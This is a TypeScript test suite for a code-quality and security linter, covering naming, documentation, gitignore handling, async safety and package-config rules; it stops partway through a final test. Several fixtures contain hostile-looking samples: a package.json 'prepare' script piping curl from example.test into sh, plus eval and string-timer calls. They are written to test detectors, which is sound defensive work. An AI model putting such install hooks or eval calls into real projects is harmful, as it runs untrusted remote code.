test("naming boolean-prefix flags untyped-prefixed boolean parameter", () => {
  const report = analyseFixture(`function configure(enabled = true): void {
  console.log(enabled);
}
`);
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.boolean-prefix" && finding.metadata?.surface === "parameter");
  assert.deepEqual(findings.map((finding) => finding.symbol), ["enabled"]);
});

test("naming boolean-prefix flags interface boolean field", () => {
  const report = analyseFixture(`interface Status {
  ready: boolean;
  isOpen: boolean;
}
`);
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.boolean-prefix" && finding.metadata?.surface === "interface-field");
  assert.deepEqual(findings.map((finding) => finding.symbol), ["ready"]);
});

test("naming boolean-prefix ignores inferred boolean parameter without annotation or literal default", () => {
  const report = analyseFixture(`function takes(enabled): unknown {
  return enabled;
}
`);
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.boolean-prefix");
  assert.deepEqual(findings, []);
});

test("naming widening preserves fingerprints for unchanged code", () => {
  const report = analyseFixture(`function process(): void {}
console.log(process);
`);
  const finding = report.findings.find((entry) => entry.ruleId === "naming.generic-function" && entry.symbol === "process");
  assert.equal(finding?.fingerprint, "6786a041045d82a8");
});

test("naming abbreviation default disabled produces no findings", () => {
  const report = analyseFixture(`function takesCtx(ctx: unknown): unknown {
  return ctx;
}
`);
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.abbreviation");
  assert.deepEqual(findings, []);
});

test("naming abbreviation enabled flags ctx parameter", () => {
  const report = analyseFixture(
    `function takesCtx(ctx: unknown): unknown {
  return ctx;
}
`,
    { config: { rules: { "naming.abbreviation": { enabled: true } } } },
  );
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.abbreviation");
  assert.deepEqual(findings.map((finding) => finding.symbol), ["ctx"]);
  assert.equal(findings[0]?.metadata?.surface, "parameter");
});

test("naming abbreviation respects acceptedAbbreviations override", () => {
  const report = analyseFixture(
    `function takesCtx(ctx: unknown): unknown {
  return ctx;
}
`,
    {
      config: {
        rules: { "naming.abbreviation": { enabled: true } },
        allowlists: { acceptedAbbreviations: ["ctx"] },
      },
    },
  );
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.abbreviation");
  assert.deepEqual(findings, []);
});

test("naming negative-boolean flags disableCache and noEnabled style names", () => {
  const report = analyseFixture(`const disableCache = true;

function configure(noEnabled = true): void {
  console.log(disableCache, noEnabled);
}
`);
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.negative-boolean");
  assert.deepEqual(findings.map((finding) => finding.symbol).sort(), ["disableCache", "noEnabled"]);
});

test("naming negative-boolean ignores noStore via allowlist", () => {
  const report = analyseFixture(`function writeResponse(noStore: boolean): void {
  console.log(noStore);
}
`);
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.negative-boolean");
  assert.deepEqual(findings, []);
});

test("naming negative-boolean message points to inversion not prefix-addition", () => {
  const report = analyseFixture(`const disableCache = true;
console.log(disableCache);
`);
  const finding = report.findings.find((entry) => entry.ruleId === "naming.negative-boolean");
  assert.match(finding?.remediation ?? "", /[Ii]nvert/);
});

test("naming generic-parameter fires only in multi-param functions above thresholds", () => {
  const positive = analyseFixture(`export function expandHelpers(data: unknown, options: unknown, target: unknown): unknown {
  return [data, options, target];
}
`);
  const flagged = positive.findings.filter((finding) => finding.ruleId === "naming.generic-parameter").map((finding) => finding.symbol);
  assert.deepEqual(flagged.sort(), ["data"]);

  const single = analyseFixture(`function double(value: number): number {
  return value * 2;
}
`);
  const noneFlagged = single.findings.filter((finding) => finding.ruleId === "naming.generic-parameter");
  assert.deepEqual(noneFlagged, []);
});

test("naming inconsistent-casing flags URL_PATH next to urlPath in one file", () => {
  const report = analyseFixture(`const URL_PATH = "/a";
const urlPath = "/b";
console.log(URL_PATH, urlPath);
`);
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.inconsistent-casing");
  assert.equal(findings.length, 1);
  assert.deepEqual(findings[0]?.metadata?.variants, ["URL_PATH", "urlPath"]);
});

test("naming inconsistent-casing ignores distinct concepts across files", () => {
  const report = analyseProject({
    "a.ts": `const URL_PATH = "/x";\nconsole.log(URL_PATH);\n`,
    "b.ts": `function handler(urlPath: string): string {\n  return urlPath;\n}\n`,
  });
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.inconsistent-casing");
  assert.deepEqual(findings, []);
});

test("naming inconsistent-casing ignores legitimate enum cases", () => {
  const report = analyseFixture(`enum Status { Ok = "OK", Error = "ERROR" }
console.log(Status.Ok, Status.Error);
`);
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.inconsistent-casing");
  assert.deepEqual(findings, []);
});

test("naming acronym-case flags URL next to Url in identifiers", () => {
  const report = analyseFixture(`const databaseUrl = "/a";
const SERVICE_URL = "/b";
console.log(databaseUrl, SERVICE_URL);
`);
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.acronym-case");
  assert.equal(findings.length, 1);
  assert.equal(findings[0]?.metadata?.acronym, "URL");
});

test("naming acronym-case respects custom knownAcronyms", () => {
  const report = analyseFixture(
    `const grpcChannel = "/a";
const GRPC_HOST = "/b";
console.log(grpcChannel, GRPC_HOST);
`,
    { config: { allowlists: { knownAcronyms: ["grpc"] } } },
  );
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.acronym-case");
  assert.equal(findings.length, 1);
  assert.equal(findings[0]?.metadata?.acronym, "GRPC");
});

test("naming acronym-case ignores acronym not in the seed and not in config", () => {
  const report = analyseFixture(`const widgetEtag = "/a";
const WIDGET_ETAG = "/b";
console.log(widgetEtag, WIDGET_ETAG);
`);
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.acronym-case");
  assert.deepEqual(findings, []);
});

test("naming rule pack catalogue coverage", () => {
  const expected = [
    "naming.abbreviation",
    "naming.acronym-case",
    "naming.boolean-prefix",
    "naming.class-file-mismatch",
    "naming.generic-function",
    "naming.generic-parameter",
    "naming.hungarian-notation",
    "naming.identifier-quality",
    "naming.inconsistent-casing",
    "naming.negative-boolean",
    "naming.short-variable",
  ];
  const descriptors = ruleDescriptors().map((descriptor) => descriptor.ruleId).filter((id) => id.startsWith("naming."));
  assert.deepEqual(descriptors, expected);

  const yamlSource = readFileSync(".gruff-ts.yaml", "utf8");
  for (const ruleId of expected) {
    assert.match(yamlSource, new RegExp(`\\b${ruleId.replace(".", "\\.")}\\b`), `missing yaml entry for ${ruleId}`);
  }
});

test("naming rule pack config disable independence", () => {
  const source = `const URL_PATH = "/a";
const urlPath = "/b";
const databaseUrl = "/c";
const DATABASE_URL = "/d";
console.log(URL_PATH, urlPath, databaseUrl, DATABASE_URL);
`;
  const both = analyseFixture(source);
  assert.equal(both.findings.some((finding) => finding.ruleId === "naming.inconsistent-casing"), true);
  assert.equal(both.findings.some((finding) => finding.ruleId === "naming.acronym-case"), true);

  const onlyAcronym = analyseFixture(source, {
    config: { rules: { "naming.inconsistent-casing": { enabled: false } } },
  });
  assert.equal(onlyAcronym.findings.some((finding) => finding.ruleId === "naming.inconsistent-casing"), false);
  assert.equal(onlyAcronym.findings.some((finding) => finding.ruleId === "naming.acronym-case"), true);

  const onlyCasing = analyseFixture(source, {
    config: { rules: { "naming.acronym-case": { enabled: false } } },
  });
  assert.equal(onlyCasing.findings.some((finding) => finding.ruleId === "naming.acronym-case"), false);
  assert.equal(onlyCasing.findings.some((finding) => finding.ruleId === "naming.inconsistent-casing"), true);
});

test("naming rule pack cross-rule overlap stays disjoint", () => {
  const report = analyseFixture(
    `const ctx = { request: 1 };
const disableCache = true;
console.log(ctx, disableCache);
`,
    { config: { rules: { "naming.abbreviation": { enabled: true } } } },
  );
  const abbreviation = report.findings.filter((finding) => finding.ruleId === "naming.abbreviation").map((finding) => finding.symbol);
  const shortVariable = report.findings.filter((finding) => finding.ruleId === "naming.short-variable").map((finding) => finding.symbol);
  assert.equal(abbreviation.includes("ctx"), true);
  assert.equal(shortVariable.includes("ctx"), false);

  const negative = report.findings.filter((finding) => finding.ruleId === "naming.negative-boolean").map((finding) => finding.symbol);
  const booleanPrefix = report.findings.filter((finding) => finding.ruleId === "naming.boolean-prefix").map((finding) => finding.symbol);
  assert.equal(negative.includes("disableCache"), true);
  assert.equal(booleanPrefix.includes("disableCache"), true);
  assert.notEqual(
    report.findings.find((finding) => finding.ruleId === "naming.negative-boolean" && finding.symbol === "disableCache")?.fingerprint,
    report.findings.find((finding) => finding.ruleId === "naming.boolean-prefix" && finding.symbol === "disableCache")?.fingerprint,
  );
});

test("naming generic-parameter ignores typed parameters in exported helpers below thresholds", () => {
  const report = analyseFixture(`export function escape(value: string): string {
  return value;
}
`,
    { config: { rules: { "naming.generic-parameter": { enabled: true, options: { minParameters: 3, minLineCount: 30, minCyclomatic: 8 } } } } },
  );
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.generic-parameter");
  assert.deepEqual(findings, []);
});

test("loads explicit yaml config path", () => {
  const report = analyseProject(
    {
      "bad.ts": `eval("console.log(1)");
`,
      "custom-gruff.yaml": `
rules:
  security.eval-call:
    enabled: false
`,
    },
    { configPath: "custom-gruff.yaml" },
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "security.eval-call"), false);
});

test("directory discovery respects root and nested gitignore rules", () => {
  const report = analyseProject(
    {
      ".gitignore": "ignored.ts\nignored-dir/\n*.ignored.ts\n!keep.ignored.ts\n",
      "tracked.ts": `eval("tracked");
`,
      "ignored.ts": `eval("ignored");
`,
      "skip.ignored.ts": `eval("skip");
`,
      "keep.ignored.ts": `eval("keep");
`,
      "ignored-dir/bad.ts": `eval("dir");
`,
      "nested/.gitignore": "*.ts\n!allowed.ts\n",
      "nested/blocked.ts": `eval("blocked");
`,
      "nested/allowed.ts": `eval("allowed");
`,
    },
    { noConfig: true },
  );

  assert.deepEqual([...evalFindingFiles(report)].sort(), ["keep.ignored.ts", "nested/allowed.ts", "tracked.ts"]);
  assert.equal(report.paths.analysedFiles, 3);
  assert.deepEqual(
    report.paths.ignoredPaths.filter((path) => ["ignored-dir", "ignored.ts", "nested/blocked.ts", "skip.ignored.ts"].includes(path)).sort(),
    ["ignored-dir", "ignored.ts", "nested/blocked.ts", "skip.ignored.ts"],
  );
});

test("gitignore fixture expectations match git check-ignore when git is available", () => {
  if (!gitAvailable()) {
    return;
  }

  const dir = mkdtempSync(join(tmpdir(), "gruff-ts-gitignore-"));
  try {
    writeFixtureFiles(dir, {
      ".gitignore": "ignored.ts\nignored-dir/\n*.ignored.ts\n!keep.ignored.ts\n",
      "tracked.ts": "",
      "ignored.ts": "",
      "skip.ignored.ts": "",
      "keep.ignored.ts": "",
      "ignored-dir/bad.ts": "",
      "nested/.gitignore": "*.ts\n!allowed.ts\n",
      "nested/blocked.ts": "",
      "nested/allowed.ts": "",
    });
    execFileSync("git", ["init"], { cwd: dir, stdio: "ignore" });

    for (const path of ["ignored.ts", "skip.ignored.ts", "ignored-dir/bad.ts", "nested/blocked.ts"]) {
      assert.equal(isGitIgnoredByGit(dir, path), true);
    }
    for (const path of ["tracked.ts", "keep.ignored.ts", "nested/allowed.ts"]) {
      assert.equal(isGitIgnoredByGit(dir, path), false);
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("include ignored scans default and Git ignored paths but keeps config policy ignores", () => {
  const files = {
    ".gitignore": "ignored.ts\n",
    ".gruff-ts.yaml": `
paths:
  ignore:
    - "policy/**"
`,
    "visible.ts": `eval("visible");
`,
    "ignored.ts": `eval("ignored");
`,
    "node_modules/pkg/index.ts": `eval("dependency");
`,
    "policy/bad.ts": `eval("policy");
`,
  };

  const normalReport = analyseProject(files, { noConfig: false });
  assert.deepEqual([...evalFindingFiles(normalReport)].sort(), ["visible.ts"]);
  assert.deepEqual(
    normalReport.paths.ignoredPaths.filter((path) => ["ignored.ts", "node_modules", "policy"].includes(path)).sort(),
    ["ignored.ts", "node_modules", "policy"],
  );

  const includeReport = analyseProject(files, { includeIgnored: true, noConfig: false });
  assert.deepEqual([...evalFindingFiles(includeReport)].sort(), ["ignored.ts", "node_modules/pkg/index.ts", "visible.ts"]);
  assert.deepEqual(includeReport.paths.ignoredPaths.filter((path) => ["ignored.ts", "node_modules", "policy"].includes(path)).sort(), ["policy"]);
});

test("directory discovery includes non-gitignored repository config surfaces", () => {
  const report = analyseProject(
    {
      ".gitignore": ".claude/settings.local.json\n.codex/local.json\n",
      ".agents/config.json": "{}\n",
      ".claude/settings.json": "{}\n",
      ".claude/settings.local.json": "{}\n",
      ".codex/config.toml": "sandbox_mode = \"danger-full-access\"\n",
      ".codex/local.json": "{}\n",
      ".github/workflows/ci.yaml": "name: ci\n",
      ".goat-flow/config.yaml": "version: 1\n",
    },
    { noConfig: true },
  );

  assert.equal(report.paths.analysedFiles, 5);
  assert.deepEqual(report.paths.ignoredPaths.sort(), [".claude/settings.local.json", ".codex/local.json"]);
});

test("explicit file inputs are scanned even when gitignored", () => {
  const report = analyseProject(
    {
      ".gitignore": "ignored.ts\n",
      "ignored.ts": `eval("ignored");
`,
    },
    { noConfig: true, paths: ["ignored.ts"] },
  );

  assert.deepEqual([...evalFindingFiles(report)], ["ignored.ts"]);
  assert.equal(report.paths.analysedFiles, 1);
  assert.deepEqual(report.paths.ignoredPaths, []);
});

test("loads default gruff-ts yaml config over no config", () => {
  const report = analyseProject(
    {
      "bad.ts": `eval("console.log(1)");
`,
      ".gruff-ts.yaml": `
rules:
  security.eval-call:
    enabled: false
`,
    },
    { noConfig: false },
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "security.eval-call"), false);
});

test("extended type-safety rubric finds explicit unsafety without false positives", () => {
  const unsafeReport = analyseFixture(`export function unsafeApi(input: ${"any"}): ${"any"} {
  // ${TS_IGNORE_DIRECTIVE}
  const user = input as ${"unknown"} as { profile?: { name: string } };
  return user${"!"}.profile${"!"}.name;
}
`);
  const unsafeRuleIds = new Set(unsafeReport.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "modernisation.ts-comment-without-rationale",
    "modernisation.non-null-assertion",
    "modernisation.double-cast",
    "waste.exported-any",
  ]) {
    assert.equal(unsafeRuleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const cleanReport = analyseFixture(`function acceptsString(value: string): string {
  return value;
}

export function safeApi(input: unknown): string {
  // ${"@ts-expect-error"} -- third-party overload rejects this documented regression fixture
  acceptsString(123);
  const user = input as { profile?: { name?: string } };
  return user.profile?.name ?? "anonymous";
}
`);
  for (const ruleId of [
    "modernisation.ts-comment-without-rationale",
    "modernisation.non-null-assertion",
    "modernisation.double-cast",
    "waste.exported-any",
  ]) {
    assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
  }
});

test("extended reliability rubric finds unsafe async patterns without false positives", () => {
  const unsafeReport = analyseFixture(`async function unreliable(userIds: string[]): Promise<void> {
  userIds.forEach(${"async"} (userId) => {
    await sendEmailAsync(userId);
  });
  ${"sendEmailAsync"}(userIds[0]);
  try {
    await sendEmailAsync("primary");
  } catch (error) {
    // ignored
  }
  throw ${JSON.stringify("failed")};
}
`);
  const unsafeRuleIds = new Set(unsafeReport.findings.map((finding) => finding.ruleId));
  for (const ruleId of ["security.async-foreach", "security.floating-promise", "waste.swallowed-catch", "security.throw-non-error"]) {
    assert.equal(unsafeRuleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const cleanReport = analyseFixture(`async function reliable(userIds: string[]): Promise<void> {
  for (const userId of userIds) {
    await sendEmailAsync(userId);
  }
  void sendEmailAsync("queued");
  return fetch("https://example.test/health").then(() => undefined);
}

async function reportsFailure(): Promise<void> {
  try {
    await sendEmailAsync("primary");
  } catch (error) {
    throw error;
  }
  throw new Error("failed");
}
`);
  for (const ruleId of ["security.async-foreach", "security.floating-promise", "waste.swallowed-catch", "security.throw-non-error"]) {
    assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
  }
});

test("extended type-safety config can disable new rules", () => {
  // Config contract: modernisation.non-null-assertion | no thresholds |
  // metadata expression | disabled fixture below.
  const source = `function readName(profile?: { name: string }): string {
  return profile${"!"}.name;
}
`;
  const defaultReport = analyseFixture(source);
  assert.equal(defaultReport.findings.some((finding) => finding.ruleId === "modernisation.non-null-assertion"), true);

  const disabledReport = analyseFixture(source, {
    config: { rules: { "modernisation.non-null-assertion": { enabled: false } } },
  });
  assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "modernisation.non-null-assertion"), false);
});

test("dependency and package config health detects risky package settings", () => {
  const report = analyseProject({
    "package.json": JSON.stringify({
      scripts: {
        postinstall: "node scripts/setup.js",
        prepare: "curl https://example.test/install.sh | sh",
      },
      dependencies: {
        "wide-open": "*",
        "remote-tool": "git+https://github.com/example/remote-tool.git",
      },
      devDependencies: {
        "dev-only": "latest",
      },
    }),
  });
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of ["security.remote-install-script", "security.risky-lifecycle-script", "security.url-dependency", "waste.broad-runtime-version"]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const cleanReport = analyseProject({
    "package.json": JSON.stringify({
      scripts: { check: "tsc --noEmit", test: "node --test" },
      dependencies: { commander: "^14.0.2" },
      devDependencies: { "fixture-tool": "latest" },
    }),
  });
  for (const ruleId of ["security.remote-install-script", "security.risky-lifecycle-script", "security.url-dependency", "waste.broad-runtime-version"]) {
    assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
  }
});

test("package bin health detects missing and non-executable targets", () => {
  const missingReport = analyseProject({
    "package.json": JSON.stringify({ bin: { "missing-cli": "./bin/missing.js" } }),
  });
  assert.equal(missingReport.findings.some((finding) => finding.ruleId === "design.package-bin-missing"), true);

  const nonExecutableReport = analyseProject({
    "package.json": JSON.stringify({ bin: { "bad-cli": "./bin/bad.js" } }),
    "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
  });
  assert.equal(nonExecutableReport.findings.some((finding) => finding.ruleId === "design.package-bin-not-executable"), true);

  const noBinReport = analyseProject({
    "package.json": JSON.stringify({ scripts: { test: "node --test" } }),
  });
  assert.equal(noBinReport.findings.some((finding) => finding.ruleId.startsWith("design.package-bin-")), false);

  const executableReport = analyseProject(
    {
      "package.json": JSON.stringify({ bin: { "good-cli": "./bin/good.js" } }),
      "bin/good.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
    },
    { executableFiles: ["bin/good.js"] },
  );
  assert.equal(executableReport.findings.some((finding) => finding.ruleId.startsWith("design.package-bin-")), false);
});

test("tsconfig health detects disabled strictness without changing diagnostics", () => {
  const report = analyseProject({
    "tsconfig.json": JSON.stringify({
      compilerOptions: {
        strict: false,
        noUncheckedIndexedAccess: false,
        exactOptionalPropertyTypes: false,
      },
    }),
  });
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "modernisation.tsconfig-strict-disabled",
    "modernisation.tsconfig-index-safety-disabled",
    "modernisation.tsconfig-exact-optional-disabled",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const cleanReport = analyseProject({
    "tsconfig.json": JSON.stringify({
      compilerOptions: {
        strict: true,
        noUncheckedIndexedAccess: true,
        exactOptionalPropertyTypes: true,
      },
    }),
  });
  for (const ruleId of [
    "modernisation.tsconfig-strict-disabled",
    "modernisation.tsconfig-index-safety-disabled",
    "modernisation.tsconfig-exact-optional-disabled",
  ]) {
    assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
  }

  const malformedReport = analyseProject({ "package.json": "{ not json" });
  assert.deepEqual(malformedReport.diagnostics, []);
});

test("core expansion finds naming and documentation rules", () => {
  const report = analyseFixture(
    `/** CustomerProfile stores customer data. */
export class CustomerRecord {
  public active = true;
}

const strName = "Ada";
const objUser = { name: strName };

/**
 * Calculates score.
 * @param amount Amount to score.
 * @param stale Removed parameter.
 */
export function calculateScore(amount: number, label: string): number {
  return amount + label.length + objUser.name.length;
}

/** updateName */
export function updateName(name: string): string {
  return name;
}
`,
    { fileName: "CustomerProfile.ts" },
  );
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "naming.boolean-prefix",
    "naming.hungarian-notation",
    "naming.class-file-mismatch",
    "docs.stale-param-tag",
    "docs.missing-param-tag",
    "docs.missing-return-tag",
    "docs.useless-docblock",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
});

test("core expansion finds modernisation rules", () => {
  const report = analyseFixture(`class AccountReader {
  public displayName: string;

  public constructor(displayName: string) {
    this.displayName = displayName;
  }

  public read(profile?: { name?: string }, fallbackName?: string): string {
    const displayName = fallbackName || "anonymous";
    if (profile && profile.name) {
      return profile.name;
    }
    return displayName;
  }
}
`);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "modernisation.readonly-property-candidate",
    "modernisation.optional-chaining-candidate",
    "modernisation.nullish-coalescing-candidate",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
});

test("parse diagnostics ignore delimiter-looking text in literals", () => {
  const report = analyseFixture(`const closer = "}";
const opener = "{";
const pattern = /[})]/;
/*
}
(
*/
function ok(value: string): string {
  return pattern.test(value) ? closer : opener;
}
`);
  assert.deepEqual(report.diagnostics, []);
});

test("scanner ignores code-like text in literals for structural rules", () => {
  const report = analyseProject({
    "src/example.test.ts": `import assert from "node:assert/strict";
import test from "node:test";

const fixtureSource = \`export class BadName {
  public value = "visible";
  public process(input: string): string {
    console.log(input);
    eval(input);
    new Function(input)();
    var legacyName = input;
    return legacyName;
  }
}\`;
const matcher = /\\bvar\\s+legacyName/;

test("fixture source text remains inert", () => {
  assert.equal(fixtureSource.includes("eval"), true);
  assert.equal(matcher.test("var legacyName"), true);
});
`,
  });
  const noisyRules = new Set([
    "docs.missing-public-doc",
    "modernisation.public-property",
    "modernisation.var-declaration",
    "naming.class-file-mismatch",
    "security.eval-call",
    "security.new-function",
    "waste.console-log",
  ]);
  assert.deepEqual(
    report.findings.filter((finding) => noisyRules.has(finding.ruleId)).map((finding) => finding.ruleId),
    [],
  );
});

test("scanner guardrail fixtures keep noisy-valid comments strings regex templates inert", () => {
  const report = analyseProject({
    "src/generated/noisy-valid.ts": `// @generated by scanner guardrail fixture.
// Prose mentions eval(input), new Function(input), setTimeout("alert(1)"), console.log(value), and var legacyName.
const literalMention = "eval(input); new Function(input)(); setTimeout(\\"alert(1)\\", 10); console.log(input); var legacyName = input;";
const templateMention = \`if (ready) { return "ok"; } setInterval("tick()", 10);\`;
const matcher = /\\beval\\s*\\(|setTimeout\\("alert\\(1\\)"\\)|var\\s+legacyName/;

function safeRender(inputText: string): string {
  const cleanedText = inputText.trim();
  return matcher.test(literalMention) ? templateMention : cleanedText;
}
`,
    "src/no-trigger.ts": `const localNumber = 1;

function computeValue(inputText: string): string {
  const paddedText = inputText.padStart(2, "0");
  return paddedText.slice(0, localNumber);
}
`,
  });
  const noisyRules = new Set([
    "docs.todo-density",
    "modernisation.var-declaration",
    "security.eval-call",
    "security.new-function",
    "security.string-timer",
    "waste.commented-out-code",
    "waste.console-log",
  ]);
  assert.deepEqual(report.diagnostics, []);
  assert.deepEqual(
    report.findings.filter((finding) => noisyRules.has(finding.ruleId)).map((finding) => `${finding.ruleId}:${finding.filePath}:${finding.line ?? 0}`),
    [],
  );
});

test("scanner guardrail fixtures keep live finding fingerprints stable", () => {
  const base = analyseFixture(`function executeInput(userInput: string): void {
  eval(userInput);
  setTimeout("alert(1)", 10);
}
`);
  const noisy = analyseFixture(`function executeInput(userInput: string): void {
  eval(userInput);
  setTimeout("alert(1)", 10);
  const literalMention = "eval(userInput); setTimeout(\\"alert(1)\\", 10);";
  const regexMention = /\\beval\\s*\\(|setTimeout\\("alert\\(1\\)"\\)/;
  const templateMention = \`eval(userInput); setTimeout("alert(1)", 10);\`;
  void literalMention;
  void regexMention;
  void templateMention;
}
`);
  const ruleIds = new Set(["security.eval-call", "security.string-timer"]);

  // Projects reports to the fingerprint fields used by scanner guardrail assertions.
  const identity = (report: AnalysisReport) =>
    report.findings
      .filter((finding) => ruleIds.has(finding.ruleId))
      .map((finding) => `${finding.ruleId}:${finding.filePath}:${finding.line ?? 0}:${finding.fingerprint}`)
      .sort();
  assert.deepEqual(identity(noisy), identity(base));
});

test("todo density counts comment markers without literal false positives", () => {
  const source = `const descriptor = "TODO/FIXME markers";
const matcher = /TODO|FIXME/;
const template = \`TODO inside a fixture string\`;
// TODO first real marker
function work(): void {
  /*
   * FIXME second real marker
   */
}
`;
  const report = analyseFixture(source, {
    config: { rules: { "docs.todo-density": { threshold: 2, severity: "advisory" } } },
  });
  const finding = report.findings.find((candidate) => candidate.ruleId === "docs.todo-density");
  assert.equal(finding?.message, "File contains 2 TODO/FIXME markers.");
  assert.equal(finding?.line, 4);

  const relaxedReport = analyseFixture(source, {
    config: { rules: { "docs.todo-density": { threshold: 3, severity: "advisory" } } },
  });
  assert.equal(relaxedReport.findings.some((finding) => finding.ruleId === "docs.todo-density"), false);
});

test("unreachable-code ignores reachable switch cases after returns", () => {
  const report = analyseFixture(`function renderFormat(format: string): string {
  switch (format) {
    case "json":
      return "json";
    case "html":
      return "html";
    default:
      return "text";
  }
}
`);

  assert.equal(report.findings.some((finding) => finding.ruleId === "waste.unreachable-code"), false);
});

test("function parser ignores calls inside ternary expressions", () => {
  const report = analyseFixture(`function chooseParser(useArray: boolean): string {
  return useArray ? parseYamlArray(1) : parseYamlScalar("value");
}

function parseYamlArray(indent: number): string {
  return String(indent);
}

function parseYamlScalar(value: string): string {
  return value.trim();
}
`);

  assert.deepEqual(
    report.findings.filter((finding) => finding.ruleId === "waste.empty-function" && (finding.symbol === "parseYamlArray" || finding.symbol === "parseYamlScalar")),
    [],
  );
});

test("function parser handles multiline expression-bodied arrows without empty-body noise", () => {
  const report = analyseFixture(`interface AnalysisReport {
  findings: Array<{ ruleId: string }>;
}

const identity = (report: AnalysisReport) =>
  report.findings
    .map((finding) => finding.ruleId)
    .join(",");

function emptyWork(): void {}

function unusedParam(value: string): void {
  return;
}
`);

  assert.deepEqual(
    report.findings.filter((finding) => finding.symbol === "identity" && ["waste.empty-function", "waste.unused-parameter"].includes(finding.ruleId)),
    [],
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "waste.empty-function" && finding.symbol === "emptyWork"), true);
  assert.equal(report.findings.some((finding) => finding.ruleId === "waste.unused-parameter" && finding.symbol === "unusedParam"), true);
});

test("documentation rubric requires file overview and comments on functions and interfaces", () => {
  const report = analyseFixture(`interface DiagnosticSourceFile {
  displayPath: string;
}

function parseDiagnostics(file: DiagnosticSourceFile, source: string): string {
  return source + file.displayPath;
}
`);
  assert.equal(report.findings.some((finding) => finding.ruleId === "docs.missing-file-overview"), true);
  assert.equal(report.findings.some((finding) => finding.ruleId === "docs.missing-interface-doc" && finding.symbol === "DiagnosticSourceFile"), true);
  assert.equal(report.findings.some((finding) => finding.ruleId === "docs.missing-function-doc" && finding.symbol === "parseDiagnostics"), true);

  const documentedReport = analyseFixture(`/**
 * Scans source text in fixtures for documentation coverage.
 */

// Minimal source contract consumed by parser diagnostics.
interface DiagnosticSourceFile {
  displayPath: string;
}

/**
 * Checks fixture source and returns a derived parser value.
 *
 * @param file - Source metadata used to report paths.
 * @param source - Raw fixture text to inspect.
 */
function parseDiagnostics(file: DiagnosticSourceFile, source: string): string {
  return source + file.displayPath;
}
`);
  for (const ruleId of ["docs.missing-file-overview", "docs.missing-interface-doc", "docs.missing-function-doc"]) {
    assert.equal(documentedReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
  }
});

test("comment quality rules extract only real comments", () => {
  const report = analyseFixture(`/**
 * Exercises line, block, and JSDoc comments for comment-quality rules.
 */
// TODO add ownership
const stringTodo = "TODO is not a comment";
const templateTodo = \`FIXME inside a template is not a comment\`;
const regexTodo = /HACK\\/\\/XXX/;

/*
 * FIXME add a tracking issue
 */
function documentedFunction(): void {}

/**
 * HACK document the interface purpose
 */
interface DocumentedShape {
  value: string;
}
`);
  const todoFindings = report.findings.filter((finding) => finding.ruleId === "docs.todo-without-tracking");
  assert.deepEqual(todoFindings.map((finding) => finding.line), [4, 9, 14]);
  assert.equal(todoFindings.every((finding) => ["TODO", "FIXME", "HACK"].includes(String(finding.metadata.marker))), true);
});

test("comment quality stale-comment flags stale references", () => {
  const report = analyseFixture(`/**
 * Exercises stale comment references.
 */
// See \`src/missing-file.ts\` before changing this helper.
// Unknown scanner rule docs.removed-rule should be deleted.
// Run with --removed-flag when debugging.
// legacy migration note mentions \`src/old-file.ts\` intentionally.
function currentFeature(): void {}

// OldFeature function
function newFeature(): void {}
`);
  const staleFindings = report.findings.filter((finding) => finding.ruleId === "docs.stale-comment");
  assert.equal(staleFindings.some((finding) => finding.metadata.referenceType === "path" && finding.message.includes("src/missing-file.ts")), true);
  assert.equal(staleFindings.some((finding) => finding.metadata.referenceType === "ruleId" && finding.message.includes("docs.removed-rule")), true);
  assert.equal(staleFindings.some((finding) => finding.metadata.referenceType === "cliFlag" && finding.message.includes("--removed-flag")), true);
  assert.equal(staleFindings.some((finding) => finding.metadata.referenceType === "function" && finding.symbol === "newFeature"), true);
  assert.equal(staleFindings.some((finding) => finding.message.includes("src/old-file.ts")), false);
});

test("comment quality requires tracking for TODO markers", () => {
  const report = analyseFixture(`/**
 * Exercises tracked and untracked task-marker comments.
 */
// TODO owner: platform-runtime
// FIXME tracked in #123
// HACK M31 keeps this fixture intentional
// XXX 2026-05-18 revisit the temporary setup
// TODO add the missing owner
function trackedTodos(): void {}
`);
